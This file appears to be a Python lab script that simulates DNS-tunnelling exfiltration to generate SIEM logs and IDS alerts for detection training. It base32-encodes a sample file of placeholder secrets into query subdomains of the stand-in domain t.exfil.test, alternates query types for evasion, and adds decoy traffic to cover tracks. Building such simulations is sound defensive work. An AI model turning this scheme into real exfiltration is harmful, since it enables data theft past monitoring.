#!/usr/bin/env python3
"""
Scenario 17: DNS Tunnelling Attack Simulation.

Simulates exfiltrating a file through DNS queries by encoding data as base32
in DNS subdomains, sending TXT/CNAME queries to the attacker-controlled
domain t.exfil.test.
"""

import base64
import json
import math
import os
import random
import sys
import time

from colorama import Fore, Style, init

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", ".."))

from wcace_lib.log_generator import LogGenerator
from wcace_lib.siem_client import SIEMClient
from wcace_lib.constants import ATTACKER_IP, DNS_SERVER_IP, DNS_TUNNEL_DOMAIN

init(autoreset=True)

LOG_DIR = os.path.join(os.path.dirname(__file__), "..", "logs", "sample_logs")

# DNS label max is 63 chars; base32 encodes 5 bytes per 8 chars.
# Keep labels under 63 and total subdomain reasonable.
MAX_LABEL_LEN = 52  # leaves room for sequence info
CHUNK_RAW_SIZE = 30  # raw bytes per DNS query (~48 base32 chars)

# Sample sensitive data to exfiltrate (simulated)
SAMPLE_DATA = (
    "CONFIDENTIAL: Project Aurora - Q3 Financial Summary\n"
    "Revenue: $14,200,000 | Expenses: $9,750,000 | Net: $4,450,000\n"
    "Key accounts: Acme Corp ($3.2M), Globex ($2.1M), Initech ($1.8M)\n"
    "Upcoming merger target: Wayne Enterprises (codename: GOTHAM)\n"
    "Board vote scheduled: 2026-03-15. Do not distribute.\n"
    "---\n"
    "Database credentials (staging): db_user=app_svc, db_pass=Pr0d_S3cret!99\n"
    "SSH key fingerprint: SHA256:xK9mQ2pL7nR4vT8wE1yU3iO6aS0dF5gH\n"
    "VPN token seed: JBSWY3DPEHPK3PXP\n"
    "END OF FILE\n"
)


def banner():
    print(f"""
{Fore.RED}{'='*62}
  WCACE Scenario 17: DNS Tunnelling Attack Simulation
  Target Domain : {DNS_TUNNEL_DOMAIN}
  Exfil Method  : Base32-encoded DNS subdomains (TXT/CNAME)
  WARNING: Educational use only
{'='*62}{Style.RESET_ALL}
""")


def encode_chunk(data: bytes, seq: int) -> str:
    """Encode a binary chunk as a DNS-safe base32 subdomain label."""
    encoded = base64.b32encode(data).decode().rstrip("=").lower()
    return f"{seq:04d}.{encoded}"


def split_into_chunks(data: bytes, chunk_size: int = CHUNK_RAW_SIZE) -> list[bytes]:
    """Split data into fixed-size chunks for DNS transport."""
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]


def phase_1_prepare(log_gen: LogGenerator) -> tuple[list[str], list[bytes]]:
    """Phase 1: Prepare data for exfiltration."""
    print(f"{Fore.YELLOW}[Phase 1] Preparing data for DNS exfiltration{Style.RESET_ALL}")
    logs = []

    data_bytes = SAMPLE_DATA.encode("utf-8")
    chunks = split_into_chunks(data_bytes)

    print(f"  [+] Target data size  : {len(data_bytes)} bytes")
    print(f"  [+] Chunk size        : {CHUNK_RAW_SIZE} bytes")
    print(f"  [+] Total chunks      : {len(chunks)}")
    print(f"  [+] Queries required  : {len(chunks)} (+ handshake/control)")

    # Log the staging activity
    logs.append(log_gen.json_log("file_access", {
        "src_ip": ATTACKER_IP,
        "action": "read",
        "path": "/opt/app/data/financial_summary.txt",
        "user": "compromised_svc",
        "size_bytes": len(data_bytes),
    }, severity="warning"))

    return logs, chunks


def phase_2_handshake(log_gen: LogGenerator) -> list[str]:
    """Phase 2: Initial handshake with C2 DNS server."""
    print(f"\n{Fore.YELLOW}[Phase 2] DNS tunnel handshake with C2{Style.RESET_ALL}")
    logs = []

    # Send an init beacon query
    beacon_data = base64.b32encode(b"INIT:17:READY").decode().rstrip("=").lower()
    init_domain = f"{beacon_data}.{DNS_TUNNEL_DOMAIN}"
    print(f"  [+] Beacon query: {init_domain}")

    logs.append(log_gen.dns_query_log(
        ATTACKER_IP, init_domain, query_type="TXT",
        response="TXT \"OK\""
    ))

    # Send session-start marker
    session_id = f"{random.randint(1000,9999):04d}"
    session_data = base64.b32encode(f"START:{session_id}".encode()).decode().rstrip("=").lower()
    session_domain = f"{session_data}.{DNS_TUNNEL_DOMAIN}"
    print(f"  [+] Session start    : ID={session_id}")
    print(f"  [+] Session query    : {session_domain}")

    logs.append(log_gen.dns_query_log(
        ATTACKER_IP, session_domain, query_type="TXT",
        response=f"TXT \"ACK:{session_id}\""
    ))

    return logs


def phase_3_exfiltrate(chunks: list[bytes], log_gen: LogGenerator) -> list[str]:
    """Phase 3: Exfiltrate data through DNS queries."""
    print(f"\n{Fore.YELLOW}[Phase 3] Exfiltrating data via DNS queries{Style.RESET_ALL}")
    logs = []

    total = len(chunks)
    query_types = ["TXT", "CNAME"]

    for seq, chunk in enumerate(chunks):
        label = encode_chunk(chunk, seq)
        fqdn = f"{label}.{DNS_TUNNEL_DOMAIN}"

        # Alternate between TXT and CNAME queries for evasion
        qtype = query_types[seq % len(query_types)]

        # Progress display
        pct = (seq + 1) / total * 100
        bar_len = 30
        filled = int(bar_len * (seq + 1) // total)
        bar = "#" * filled + "-" * (bar_len - filled)
        print(f"\r  [{bar}] {pct:5.1f}% ({seq+1}/{total}) -> {qtype} {fqdn[:60]}...", end="")

        logs.append(log_gen.dns_query_log(
            ATTACKER_IP, fqdn, query_type=qtype,
            response=f"{qtype} \"ACK:{seq}\""
        ))

        # Simulate realistic delay (jitter)
        time.sleep(random.uniform(0.05, 0.15))

    print()  # newline after progress bar
    print(f"  {Fore.RED}[!] {total} DNS queries sent with encoded data{Style.RESET_ALL}")

    return logs


def phase_4_finalize(chunks: list[bytes], log_gen: LogGenerator) -> list[str]:
    """Phase 4: Send end-of-transmission marker and verification."""
    print(f"\n{Fore.YELLOW}[Phase 4] Finalizing DNS tunnel transmission{Style.RESET_ALL}")
    logs = []

    # Send completion marker
    total_bytes = sum(len(c) for c in chunks)
    checksum = sum(total_bytes.to_bytes(4, "big")) % 256
    end_data = base64.b32encode(f"END:{len(chunks)}:{checksum}".encode()).decode().rstrip("=").lower()
    end_domain = f"{end_data}.{DNS_TUNNEL_DOMAIN}"

    print(f"  [+] End marker       : chunks={len(chunks)}, checksum={checksum}")
    print(f"  [+] Final query      : {end_domain}")

    logs.append(log_gen.dns_query_log(
        ATTACKER_IP, end_domain, query_type="TXT",
        response="TXT \"COMPLETE\""
    ))

    # Generate IDS alerts that would be triggered
    logs.append(log_gen.ids_alert(
        ATTACKER_IP, DNS_SERVER_IP,
        "ET DNS Excessive DNS Queries to single domain - Possible DNS Tunnel",
        sid=9170001, severity=1
    ))
    logs.append(log_gen.ids_alert(
        ATTACKER_IP, DNS_SERVER_IP,
        "ET DNS Long DNS TXT Query - Potential Data Exfiltration",
        sid=9170002, severity=1
    ))
    logs.append(log_gen.ids_alert(
        ATTACKER_IP, DNS_SERVER_IP,
        "ET DNS High Entropy Subdomain - DNS Tunnel Indicator",
        sid=9170003, severity=2
    ))

    return logs


def phase_5_cover_tracks(log_gen: LogGenerator) -> list[str]:
    """Phase 5: Generate normal DNS traffic to blend in."""
    print(f"\n{Fore.YELLOW}[Phase 5] Cover tracks - generating benign DNS noise{Style.RESET_ALL}")
    logs = []

    benign_domains = [
        "www.google.com", "mail.google.com", "outlook.office365.com",
        "api.github.com", "cdn.jsdelivr.net", "fonts.googleapis.com",
        "static.cloudflare.com", "updates.microsoft.com",
        "registry.npmjs.org", "pypi.org",
    ]

    for domain in benign_domains:
        logs.append(log_gen.dns_query_log(
            ATTACKER_IP, domain, query_type="A",
            response=f"A {random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        ))

    print(f"  [+] Generated {len(benign_domains)} benign DNS queries as cover traffic")

    return logs


def main():
    banner()

    log_gen = LogGenerator(source_host="compromised-ws")
    all_logs = []

    # Execute attack phases
    prep_logs, chunks = phase_1_prepare(log_gen)
    all_logs.extend(prep_logs)
    all_logs.extend(phase_2_handshake(log_gen))
    all_logs.extend(phase_3_exfiltrate(chunks, log_gen))
    all_logs.extend(phase_4_finalize(chunks, log_gen))
    all_logs.extend(phase_5_cover_tracks(log_gen))

    # Save logs
    os.makedirs(LOG_DIR, exist_ok=True)
    log_file = os.path.join(LOG_DIR, "dns_tunnel_attack.jsonl")
    SIEMClient.write_logs_to_file(all_logs, log_file)

    print(f"\n{Fore.GREEN}[*] DNS tunnelling simulation complete")
    print(f"[*] {len(all_logs)} log entries written to {log_file}{Style.RESET_ALL}")

    # Summary statistics
    dns_queries = sum(1 for l in all_logs if '"event_type": "dns_query"' in l)
    ids_alerts = sum(1 for l in all_logs if '"event_type": "ids_alert"' in l)
    print(f"[*] DNS queries generated : {dns_queries}")
    print(f"[*] IDS alerts generated  : {ids_alerts}")

    # Try to send to Loki if available
    try:
        siem = SIEMClient()
        siem.loki_push_lines(
            {"job": "attack_sim", "scenario": "17-dns-tunnel"},
            all_logs
        )
        print(f"[*] Logs pushed to Loki")
    except Exception:
        print(f"[*] Loki not available - logs saved locally only")


if __name__ == "__main__":
    main()
